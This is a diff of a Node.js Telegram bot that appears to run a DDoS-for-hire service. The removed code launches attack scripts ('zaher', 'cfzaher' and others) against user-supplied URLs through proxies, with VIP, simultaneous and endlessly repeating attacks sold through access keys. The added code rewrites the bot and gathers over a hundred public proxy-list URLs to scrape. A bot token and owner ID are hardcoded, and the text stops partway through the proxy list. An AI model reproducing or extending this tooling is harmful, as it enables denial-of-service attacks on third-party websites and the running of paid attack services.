@@ -1,1195 +1,774 @@
-const fs = require('fs').promises;
-const { spawn } = require('child_process');
-const moment = require('moment');
+const fs = require('fs');
 const path = require('path');
+const { spawn } = require('child_process');
 const TelegramBot = require('node-telegram-bot-api');
+const axios = require('axios');
+const crypto = require('crypto');
 
-// ==================== Configuration ====================
-class Config {
-  constructor() {
-    this.botToken = '8466880238:AAGGEFLQ9T3TGrgoY0RgDHBUW2jKG7k3nLs';
-    this.botName = 'Permanent';
-    this.adminId = 7780973203;
-    this.maxFreeTime = 120;
-    this.adminMaxTime = 999999;
-    this.cooldownTime = 10;
-    this.validMethods = ['zaher', 'zaherH2', 'cfzaher'];
-    this.vipMethods = [...this.validMethods];
-    this.simulMethods = ['zaher'];
-    this.methodsFile = path.join(__dirname, 'assets', 'methods.json');
-    this.userDataFile = path.join(__dirname, 'data', 'users.json');
-    this.keysFile = path.join(__dirname, 'data', 'keys.json');
-    this.configFile = path.join(__dirname, 'data', 'config.json');
-    this.maxSlots = 3;
-    this.adminMaxSlots = 10;
-    this.pollingOptions = {
-      interval: 300,
-      timeout: 10,
-      limit: 100,
-      retryTimeout: 5000,
-      params: { timeout: 10 }
-    };
-    this.simultaneousAttacks = {
-      enabled: true,
-      maxConcurrent: 5,
-      defaultMethods: ['zaher', 'zaherH2', 'cfzaher'],
-      cooldownMultiplier: 1.5
-    };
-  }
+// ---------- CONFIGURATION ----------
+const BOT_TOKEN = '8466880238:AAGGEFLQ9T3TGrgoY0RgDHBUW2jKG7k3nLs';
+const OWNER_ID = 7780973203; // your Telegram user ID (owner)
+const SCRIPT_DIR = __dirname;
+const PROXY_DIR = __dirname;
+const DEFAULT_PROXY_FILE = 'proxy.txt';
+const ATTACK_ANIMATION_URL = 'https://a.top4top.io/m_3718ze7811.mp4';
+const DATA_FILE = path.join(__dirname, 'bot_data.json');
+// -----------------------------------
 
-  async load() {
-    try {
-      const data = await fs.readFile(this.configFile, 'utf8');
-      const saved = JSON.parse(data);
-      if (saved.vipMethods) this.vipMethods = saved.vipMethods;
-      if (saved.simulMethods) this.simulMethods = saved.simulMethods;
-      if (saved.simultaneousAttacks) this.simultaneousAttacks.maxConcurrent = saved.simultaneousAttacks.maxConcurrent;
-      console.log('✅ Loaded saved configuration');
-    } catch (err) {
-      if (err.code !== 'ENOENT') console.error('❌ Error loading config:', err);
-    }
-  }
+const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 
-  async save() {
-    try {
-      const dir = path.dirname(this.configFile);
-      await fs.mkdir(dir, { recursive: true });
-      const toSave = {
-        vipMethods: this.vipMethods,
-        simulMethods: this.simulMethods,
-        simultaneousAttacks: { maxConcurrent: this.simultaneousAttacks.maxConcurrent },
-        lastUpdated: new Date().toISOString()
-      };
-      await fs.writeFile(this.configFile, JSON.stringify(toSave, null, 2));
-      console.log('✅ Configuration saved');
-    } catch (err) {
-      console.error('❌ Error saving config:', err);
-    }
-  }
-}
+const activeAttacks = new Map();
+let nextAttackId = 1;
 
-// ==================== Data Manager ====================
-class DataManager {
-  constructor(config) {
-    this.config = config;
-    this.users = {};
-    this.keys = {};
-  }
+// ---------- PERSISTENT STORAGE ----------
+let db = { users: {}, keys: {} };
 
-  async loadUsers() {
-    try {
-      const data = await fs.readFile(this.config.userDataFile, 'utf8');
-      this.users = JSON.parse(data);
-    } catch (err) {
-      if (err.code !== 'ENOENT') console.error('Error loading user data:', err);
-    }
-  }
-
-  async saveUsers() {
-    try {
-      const dir = path.dirname(this.config.userDataFile);
-      await fs.mkdir(dir, { recursive: true });
-      await fs.writeFile(this.config.userDataFile, JSON.stringify(this.users, null, 2));
-    } catch (err) {
-      console.error('Error saving user data:', err);
-    }
-  }
-
-  async loadKeys() {
-    try {
-      const data = await fs.readFile(this.config.keysFile, 'utf8');
-      this.keys = JSON.parse(data);
-    } catch (err) {
-      if (err.code !== 'ENOENT') console.error('Error loading keys data:', err);
-    }
-  }
-
-  async saveKeys() {
-    try {
-      const dir = path.dirname(this.config.keysFile);
-      await fs.mkdir(dir, { recursive: true });
-      await fs.writeFile(this.config.keysFile, JSON.stringify(this.keys, null, 2));
-    } catch (err) {
-      console.error('Error saving keys data:', err);
-    }
-  }
-
-  recordUserActivity(userId, username, chatId) {
-    if (!this.users[userId]) {
-      this.users[userId] = {
-        username: username || `user_${userId}`,
-        chatId,
-        firstSeen: new Date().toISOString(),
-        lastSeen: new Date().toISOString(),
-        attackCount: 0,
-        key: null,
-        simultaneousAttacks: 0
-      };
+function loadData() {
+  try {
+    if (fs.existsSync(DATA_FILE)) {
+      const raw = fs.readFileSync(DATA_FILE);
+      db = JSON.parse(raw);
     } else {
-      this.users[userId].lastSeen = new Date().toISOString();
-      this.users[userId].username = username || this.users[userId].username;
+      db = { users: {}, keys: {} };
+      saveData();
     }
-    this.saveUsers(); // fire and forget
-  }
-
-  validateKey(key) {
-    return this.keys[key] && this.keys[key].enabled;
-  }
-
-  getUserKey(userId) {
-    return this.users[userId]?.key;
-  }
-
-  setUserKey(userId, key) {
-    if (!this.users[userId]) {
-      this.users[userId] = { username: `user_${userId}`, chatId: null, firstSeen: new Date().toISOString(), lastSeen: new Date().toISOString(), attackCount: 0, key, simultaneousAttacks: 0 };
-    } else {
-      this.users[userId].key = key;
-    }
-    if (!this.keys[key].usedBy.includes(userId)) {
-      this.keys[key].usedBy.push(userId);
-    }
-    this.saveUsers();
-    this.saveKeys();
-  }
-
-  incrementAttackCount(userId, count = 1) {
-    if (this.users[userId]) {
-      this.users[userId].attackCount += count;
-      this.saveUsers();
-    }
-  }
-
-  incrementSimultaneousCount(userId) {
-    if (this.users[userId]) {
-      this.users[userId].simultaneousAttacks++;
-      this.saveUsers();
-    }
+  } catch (err) {
+    console.error('Failed to load data:', err);
+    db = { users: {}, keys: {} };
   }
 }
 
-// ==================== Attack Executor ====================
-class AttackExecutor {
-  constructor(config, dataManager, activeAttacks, userAttackSlots) {
-    this.config = config;
-    this.dataManager = dataManager;
-    this.activeAttacks = activeAttacks;
-    this.userAttackSlots = userAttackSlots;
-  }
-
-  runAttack(method, url, port, time, userId, chatId) {
-    return new Promise((resolve, reject) => {
-      const attackId = `${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
-      const scriptName = method.toUpperCase();
-      let args = [];
-      switch (method.toLowerCase()) {
-        case 'zaher': args = [scriptName + '.js', url, time, '85', '10', 'proxy.txt']; break;
-        case 'zaherh2': args = [scriptName + '.js', url, time, '100', '11', 'proxy.txt']; break;
-        case 'cfzaher': args = [scriptName + '.js', url, time, '58', '16', 'proxy.txt']; break;
-        default: args = [scriptName + '.js', url, time, '64', '10', 'proxy.txt'];
-      }
-      const scriptPath = path.join(__dirname, scriptName + '.js');
-      if (!fs.existsSync(scriptPath)) {
-        return reject(new Error(`Attack script for ${method} not found`));
-      }
-
-      console.log(`Starting ${method} attack: node ${args.join(' ')}`);
-      const child = spawn('node', args, { stdio: 'inherit' });
-
-      const attackInfo = { userId, chatId, child, target: url, method, startTime: Date.now(), duration: parseInt(time) * 1000, attackId };
-      this.activeAttacks.set(attackId, attackInfo);
-      this._addToUserSlots(userId, attackId);
-
-      const timeout = setTimeout(() => {
-        if (this.activeAttacks.has(attackId)) {
-          child.kill('SIGTERM');
-          this.activeAttacks.delete(attackId);
-          this._removeFromUserSlots(userId, attackId);
-        }
-      }, parseInt(time) * 1000);
-
-      child.on('exit', (code, signal) => {
-        clearTimeout(timeout);
-        if (this.activeAttacks.has(attackId)) {
-          this.activeAttacks.delete(attackId);
-          this._removeFromUserSlots(userId, attackId);
-        }
-        if (code === 0 || signal === 'SIGTERM') resolve(attackId);
-        else reject(new Error(`${method} attack script exited with code ${code}`));
-      });
-
-      child.on('error', (err) => {
-        clearTimeout(timeout);
-        if (this.activeAttacks.has(attackId)) {
-          this.activeAttacks.delete(attackId);
-          this._removeFromUserSlots(userId, attackId);
-        }
-        reject(err);
-      });
-    });
-  }
-
-  _addToUserSlots(userId, attackId) {
-    const slots = this.userAttackSlots.get(userId) || [];
-    slots.push(attackId);
-    this.userAttackSlots.set(userId, slots);
-  }
-
-  _removeFromUserSlots(userId, attackId) {
-    const slots = this.userAttackSlots.get(userId) || [];
-    const index = slots.indexOf(attackId);
-    if (index !== -1) {
-      slots.splice(index, 1);
-      this.userAttackSlots.set(userId, slots);
-    }
-  }
-
-  async runVipAttack(url, time, userId, chatId) {
-    const promises = this.config.vipMethods.map(m => this.runAttack(m, url, 443, time, userId, chatId));
-    const results = await Promise.allSettled(promises);
-    const failed = results.filter(r => r.status === 'rejected').length;
-    return { success: true, methodCount: this.config.vipMethods.length, failed };
-  }
-
-  async runSimultaneousAttacks(url, time, userId, chatId, customMethods = []) {
-    const methods = customMethods.length ? customMethods : this.config.simulMethods;
-    const promises = methods.map(m => this.runAttack(m, url, 443, time, userId, chatId));
-    const results = await Promise.allSettled(promises);
-    const failed = results.filter(r => r.status === 'rejected').length;
-    return { success: true, methodCount: methods.length, failed };
-  }
-
-  async runCustomSimultaneousAttack(url, time, methods, userId, chatId) {
-    const invalid = methods.filter(m => !this.config.validMethods.includes(m));
-    if (invalid.length) throw new Error(`Invalid methods: ${invalid.join(', ')}`);
-    if (methods.length > this.config.simultaneousAttacks.maxConcurrent) {
-      throw new Error(`Maximum ${this.config.simultaneousAttacks.maxConcurrent} methods allowed`);
-    }
-    return this.runSimultaneousAttacks(url, time, userId, chatId, methods);
+function saveData() {
+  try {
+    fs.writeFileSync(DATA_FILE, JSON.stringify(db, null, 2));
+  } catch (err) {
+    console.error('Failed to save data:', err);
   }
 }
 
-// ==================== Attack Manager ====================
-class AttackManager {
-  constructor(config, dataManager, activeAttacks, userAttackSlots, userAttackStatus) {
-    this.config = config;
-    this.dataManager = dataManager;
-    this.activeAttacks = activeAttacks;
-    this.userAttackSlots = userAttackSlots;
-    this.userAttackStatus = userAttackStatus;
-  }
+loadData();
 
-  canUserAttack(userId) {
-    if (userId === this.config.adminId) return true;
-    const key = this.dataManager.getUserKey(userId);
-    if (!key || !this.dataManager.validateKey(key)) return false;
-    const status = this.userAttackStatus.get(userId);
-    if (!status) return true;
-    const now = Date.now();
-    if (status.status === 'running') return false;
-    if (status.status === 'cooldown' && now < status.readyTime) return false;
-    return true;
-  }
-
-  setUserRunning(userId) {
-    this.userAttackStatus.set(userId, { status: 'running' });
-  }
-
-  setUserCooldown(userId, multiplier = 1) {
-    const cooldownMs = this.config.cooldownTime * multiplier * 1000;
-    this.userAttackStatus.set(userId, { status: 'cooldown', readyTime: Date.now() + cooldownMs });
-  }
-
-  clearUserStatus(userId) {
-    this.userAttackStatus.delete(userId);
-  }
-
-  getRemainingCooldown(userId) {
-    const status = this.userAttackStatus.get(userId);
-    if (status?.status === 'cooldown') {
-      return Math.ceil((status.readyTime - Date.now()) / 1000);
-    }
-    return 0;
-  }
-
-  getUserSlots(userId) {
-    return this.userAttackSlots.get(userId) || [];
-  }
-
-  getMaxSlots(userId) {
-    return userId === this.config.adminId ? this.config.adminMaxSlots : this.config.maxSlots;
-  }
-
-  hasAvailableSlot(userId) {
-    return this.getUserSlots(userId).length < this.getMaxSlots(userId);
-  }
-
-  canRunSimultaneous(userId, requiredSlots) {
-    return this.getUserSlots(userId).length + requiredSlots <= this.getMaxSlots(userId);
-  }
-
-  async stopUserAttacks(userId, bot) {
-    let stopped = 0;
-    for (const attackId of this.getUserSlots(userId)) {
-      const attack = this.activeAttacks.get(attackId);
-      if (attack?.child) {
-        attack.child.kill('SIGTERM');
-        stopped++;
-        this.activeAttacks.delete(attackId);
-        try {
-          await bot.sendMessage(attack.chatId, `⛔ Your attack on ${attack.target} has been stopped`);
-        } catch {}
-      }
-    }
-    this.userAttackSlots.set(userId, []);
-    return stopped;
-  }
-
-  async stopAllAttacks(bot) {
-    let stopped = 0;
-    for (const [attackId, attack] of this.activeAttacks.entries()) {
-      if (attack.child) {
-        attack.child.kill('SIGTERM');
-        stopped++;
-        try {
-          await bot.sendMessage(attack.chatId, `⛔ Your attack has been stopped by administrator`);
-        } catch {}
-      }
-      this.activeAttacks.delete(attackId);
-      this._removeFromUserSlots(attack.userId, attackId);
-    }
-    return stopped;
-  }
-
-  _removeFromUserSlots(userId, attackId) {
-    const slots = this.userAttackSlots.get(userId) || [];
-    const index = slots.indexOf(attackId);
-    if (index !== -1) slots.splice(index, 1);
-    this.userAttackSlots.set(userId, slots);
-  }
-}
-
-// ==================== Unlimited Attack Manager ====================
-class UnlimitedAttackManager {
-  constructor(attackExecutor, unlimitedAttacks) {
-    this.attackExecutor = attackExecutor;
-    this.unlimitedAttacks = unlimitedAttacks;
-  }
-
-  async start(userId, chatId, url) {
-    const attackId = `unlimited_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
-    this.unlimitedAttacks.set(attackId, { userId, chatId, url, active: true });
-
-    const runCycle = async () => {
-      if (!this.unlimitedAttacks.has(attackId) || !this.unlimitedAttacks.get(attackId).active) return;
-      try {
-        console.log(`♾️ Starting unlimited attack cycle for ${url}`);
-        await this.attackExecutor.runSimultaneousAttacks(url, '120', userId, chatId);
-        if (this.unlimitedAttacks.has(attackId) && this.unlimitedAttacks.get(attackId).active) {
-          setTimeout(runCycle, 2000);
-        }
-      } catch {
-        if (this.unlimitedAttacks.has(attackId) && this.unlimitedAttacks.get(attackId).active) {
-          setTimeout(runCycle, 5000);
-        }
-      }
-    };
-
-    runCycle();
-    return attackId;
-  }
-
-  stop(attackId) {
-    const attack = this.unlimitedAttacks.get(attackId);
-    if (attack) attack.active = false;
-    this.unlimitedAttacks.delete(attackId);
-  }
-
-  stopAllForUser(userId) {
-    let count = 0;
-    for (const [attackId, attack] of this.unlimitedAttacks.entries()) {
-      if (attack.userId === userId) {
-        attack.active = false;
-        this.unlimitedAttacks.delete(attackId);
-        count++;
-      }
-    }
-    return count;
-  }
-
-  hasForUser(userId) {
-    for (const attack of this.unlimitedAttacks.values()) {
-      if (attack.userId === userId && attack.active) return true;
-    }
+// ---------- AUTHORIZATION ----------
+function isAuthorized(userId) {
+  const user = db.users[userId];
+  if (!user) return false;
+  if (user.expires < Date.now()) {
+    // expired, remove user
+    delete db.users[userId];
+    saveData();
     return false;
   }
-
-  getAllForUser(userId) {
-    const result = [];
-    for (const [attackId, attack] of this.unlimitedAttacks.entries()) {
-      if (attack.userId === userId) result.push({ attackId, ...attack });
-    }
-    return result;
-  }
+  return true;
 }
 
-// ==================== Utilities ====================
-const defaultMethods = [
-  { name: 'ZAHER', description: 'Zaher method attack', sts: 'Active' },
-  { name: 'ZAHERH2', description: 'H2 version of Zaher method', sts: 'Active' },
-  { name: 'CFZAHER', description: 'Cloudflare Zaher method', sts: 'Active' }
+// ---------- PROXY SCRAPER ----------
+const raw_proxy_sites = [
+  "https://raw.githubusercontent.com/zloi-user/hideip.me/main/socks5.txt",
+  "https://raw.githubusercontent.com/zloi-user/hideip.me/main/socks4.txt",
+  "https://raw.githubusercontent.com/zloi-user/hideip.me/main/https.txt",
+  "https://raw.githubusercontent.com/zloi-user/hideip.me/main/http.txt",
+  "https://raw.githubusercontent.com/zloi-user/hideip.me/main/connect.txt",
+  "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/all.txt",
+  "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/socks5.txt",
+  "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/socks4.txt",
+  "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/proxy.txt",
+  "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/https.txt",
+  "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/http.txt",
+  "https://raw.githubusercontent.com/yuceltoluyag/GoodProxy/main/raw.txt",
+  "https://raw.githubusercontent.com/yogendratamang48/ProxyList/master/proxies.txt",
+  "https://raw.githubusercontent.com/yemixzy/proxy-list/master/proxies.txt",
+  "https://raw.githubusercontent.com/yemixzy/proxy-list/main/proxies/unchecked.txt",
+  "https://raw.githubusercontent.com/Vann-Dev/proxy-list/main/proxies/socks5.txt",
+  "https://raw.githubusercontent.com/Vann-Dev/proxy-list/main/proxies/socks4.txt",
+  "https://raw.githubusercontent.com/Vann-Dev/proxy-list/main/proxies/https.txt",
+  "https://raw.githubusercontent.com/Vann-Dev/proxy-list/main/proxies/http.txt",
+  "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/socks5.txt",
+  "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/socks4.txt",
+  "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/proxylist.txt",
+  "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/https.txt",
+  "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/http.txt",
+  "https://raw.githubusercontent.com/UptimerBot/proxy-list/main/proxies/socks5.txt",
+  "https://raw.githubusercontent.com/UptimerBot/proxy-list/main/proxies/socks4.txt",
+  "https://raw.githubusercontent.com/UptimerBot/proxy-list/main/proxies/http.txt",
+  "https://raw.githubusercontent.com/tuanminpay/live-proxy/master/socks5.txt",
+  "https://raw.githubusercontent.com/TuanMinPay/live-proxy/master/socks5.txt",
+  "https://raw.githubusercontent.com/tuanminpay/live-proxy/master/socks4.txt",
+  "https://raw.githubusercontent.com/TuanMinPay/live-proxy/master/socks4.txt",
+  "https://raw.githubusercontent.com/tuanminpay/live-proxy/master/http.txt",
+  "https://raw.githubusercontent.com/TuanMinPay/live-proxy/master/http.txt",
+  "https://raw.githubusercontent.com/tuanminpay/live-proxy/master/all.txt",
+  "https://raw.githubusercontent.com/TuanMinPay/live-proxy/master/all.txt",
+  "https://raw.githubusercontent.com/Tsprnay/Proxy-lists/master/proxies/https.txt",
+  "https://raw.githubusercontent.com/Tsprnay/Proxy-lists/master/proxies/http.txt",
+  "https://raw.githubusercontent.com/Tsprnay/Proxy-lists/master/proxies/all.txt",
+  "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",
+  "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
+  "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
+  "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
+  "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
+  "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
+  "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/generated/socks5_proxies.txt",
+  "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/generated/socks4_proxies.txt",
+  "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/generated/http_proxies.txt",
+  "https://raw.githubusercontent.com/sunny9577/proxy-scraper/main/proxies.txt",
+  "https://raw.githubusercontent.com/sunny9577/proxy-scraper/main/generated/socks5_proxies.txt",
+  "https://raw.githubusercontent.com/sunny9577/proxy-scraper/main/generated/socks4_proxies.txt",
+  "https://raw.githubusercontent.com/sunny9577/proxy-scraper/main/generated/http_proxies.txt",
+  "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
+  "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
+  "https://raw.githubusercontent.com/shiftytr/proxy-list/master/proxy.txt",
+  "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/proxy.txt",
+  "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
+  "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
+  "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/working.txt",
+  "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/ultrafast.txt",
+  "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks5.txt",
+  "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks4.txt",
+  "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/premium.txt",
+  "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/new.txt",
+  "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/http.txt",
+  "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/fast.txt",
+  "https://raw.githubusercontent.com/saisuiu/Lionkings-Http-Proxys-Proxies/main/free.txt",
+  "https://raw.githubusercontent.com/saisuiu/Lionkings-Http-Proxys-Proxies/main/cnfree.txt",
+  "https://raw.githubusercontent.com/RX4096/proxy-list/main/online/socks5.txt",
+  "https://raw.githubusercontent.com/RX4096/proxy-list/main/online/socks4.txt",
+  "https://raw.githubusercontent.com/RX4096/proxy-list/main/online/https.txt",
+  "https://raw.githubusercontent.com/RX4096/proxy-list/main/online/http.txt",
+  "https://raw.githubusercontent.com/rx443/proxy-list/main/online/https.txt",
+  "https://raw.githubusercontent.com/rx443/proxy-list/main/online/http.txt",
+  "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
+  "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
+  "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
+  "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTP_RAW.txt",
+  "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies_anonymous/socks5.txt",
+  "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies_anonymous/socks4.txt",
+  "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies_anonymous/http.txt",
+  "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/socks5.txt",
+  "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/socks4.txt",
+  "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/http.txt",
+  "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks5.txt",
+  "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks4.txt",
+  "https://raw.githubusercontent.com/prxchk/proxy-list/main/https.txt",
+  "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt",
+  "https://raw.githubusercontent.com/prxchk/proxy-list/main/all.txt",
+  "https://raw.githubusercontent.com/ProxyScraper/ProxyScraper/main/socks5.txt",
+  "https://raw.githubusercontent.com/ProxyScraper/ProxyScraper/main/socks4.txt",
+  "https://raw.githubusercontent.com/ProxyScraper/ProxyScraper/main/http.txt",
+  "https://raw.githubusercontent.com/proxylist-to/proxy-list/main/socks5.txt",
+  "https://raw.githubusercontent.com/proxylist-to/proxy-list/main/socks4.txt",
+  "https://raw.githubusercontent.com/proxylist-to/proxy-list/main/http.txt",
+  "https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/https.txt",
+  "https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/http.txt",
+  "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt",
+  "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/all/data.txt",
+  "https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt",
+  "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/xResults/RAW.txt",
+  "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/xResults/old-data/Proxies.txt",
+  "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/socks5/socks5.txt",
+  "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/socks4/socks4.txt",
+  "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/https/https.txt",
+  "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt",
+  "https://raw.githubusercontent.com/ObcbO/getproxy/master/socks5.txt",
+  "https://raw.githubusercontent.com/ObcbO/getproxy/master/socks4.txt",
+  "https://raw.githubusercontent.com/ObcbO/getproxy/master/https.txt",
+  "https://raw.githubusercontent.com/ObcbO/getproxy/master/http.txt",
+  "https://raw.githubusercontent.com/ObcbO/getproxy/master/file/socks5.txt",
+  "https://raw.githubusercontent.com/ObcbO/getproxy/master/file/socks4.txt",
+  "https://raw.githubusercontent.com/ObcbO/getproxy/master/file/https.txt",
+  "https://raw.githubusercontent.com/ObcbO/getproxy/master/file/http.txt",
+  "https://raw.githubusercontent.com/mython-dev/free-proxy-4000/main/proxy-4000.txt",
+  "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/socks5.txt",
+  "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/socks4.txt",
+  "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/https.txt",
+  "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http.txt",
+  "https://raw.githubusercontent.com/MrMarble/proxy-list/main/all.txt",
+  "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies_anonymous/socks5.txt",
+  "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies_anonymous/socks4.txt",
+  "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies_anonymous/http.txt",
+  "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
+  "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt",
+  "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/https.txt",
+  "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
+  "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
+  "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks4.txt",
+  "https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt",
+  "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
+  "https://raw.githubusercontent.com/miyukii-chan/proxy-list/master/proxies/http.txt",
+  "https://raw.githubusercontent.com/mishakorzik/Free-Proxy/main/proxy.txt",
+  "https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt",
+  "https://raw.githubusercontent.com/manuGMG/proxy-365/main/SOCKS5.txt",
+  "https://raw.githubusercontent.com/mallisc5/master/proxy-list-raw.txt",
+  "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies.txt",
+  "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",
+  "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt",
+  "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt",
+  "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
+  "https://raw.githubusercontent.com/j0rd1s3rr4n0/api/main/proxy/http.txt",
+  "https://raw.githubusercontent.com/ItzRazvyy/ProxyList/main/socks5.txt",
+  "https://raw.githubusercontent.com/ItzRazvyy/ProxyList/main/socks4.txt",
+  "https://raw.githubusercontent.com/ItzRazvyy/ProxyList/main/https.txt",
+  "https://raw.githubusercontent.com/ItzRazvyy/ProxyList/main/http.txt",
+  "https://raw.githubusercontent.com/im-razvan/proxy_list/main/socks5",
+  "https://raw.githubusercontent.com/im-razvan/proxy_list/main/http.txt",
+  "https://raw.githubusercontent.com/HyperBeats/proxy-list/main/socks5.txt",
+  "https://raw.githubusercontent.com/HyperBeats/proxy-list/main/socks4.txt",
+  "https://raw.githubusercontent.com/HyperBeats/proxy-list/main/https.txt",
+  "https://raw.githubusercontent.com/HyperBeats/proxy-list/main/http.txt",
+  "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
+  "https://raw.githubusercontent.com/hendrikbgr/Free-Proxy-Repo/master/proxy_list.txt",
+  "https://raw.githubusercontent.com/fate0/proxylist/master/proxy.list",
+  "https://raw.githubusercontent.com/fahimscirex/proxybd/master/proxylist/socks4.txt",
+  "https://raw.githubusercontent.com/fahimscirex/proxybd/master/proxylist/http.txt",
+  "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/socks5.txt",
+  "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/socks4.txt",
+  "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/https.txt",
+  "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/http.txt",
+  "https://raw.githubusercontent.com/enseitankado/proxine/main/proxy/socks5.txt",
+  "https://raw.githubusercontent.com/enseitankado/proxine/main/proxy/socks4.txt",
+  "https://raw.githubusercontent.com/enseitankado/proxine/main/proxy/https.txt",
+  "https://raw.githubusercontent.com/enseitankado/proxine/main/proxy/http.txt",
+  "https://raw.githubusercontent.com/elliottophellia/yakumo/master/results/socks5/global/socks5_checked.txt",
+  "https://raw.githubusercontent.com/elliottophellia/yakumo/master/results/socks4/global/socks4_checked.txt",
+  "https://raw.githubusercontent.com/elliottophellia/yakumo/master/results/mix_checked.txt",
+  "https://raw.githubusercontent.com/elliottophellia/yakumo/master/results/http/global/http_checked.txt",
+  "https://raw.githubusercontent.com/dunno10-a/proxy/main/proxies/socks5.txt",
+  "https://raw.githubusercontent.com/dunno10-a/proxy/main/proxies/socks4.txt",
+  "https://raw.githubusercontent.com/dunno10-a/proxy/main/proxies/https.txt",
+  "https://raw.githubusercontent.com/dunno10-a/proxy/main/proxies/http.txt",
+  "https://raw.githubusercontent.com/dunno10-a/proxy/main/proxies/all.txt",
+  "https://raw.githubusercontent.com/Daesrock/XenProxy/main/socks5.txt",
+  "https://raw.githubusercontent.com/Daesrock/XenProxy/main/socks4.txt",
+  "https://raw.githubusercontent.com/Daesrock/XenProxy/main/proxylist.txt",
+  "https://raw.githubusercontent.com/Daesrock/XenProxy/main/https.txt",
+  "https://raw.githubusercontent.com/crackmag/proxylist/proxy/proxy.list",
+  "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list.txt",
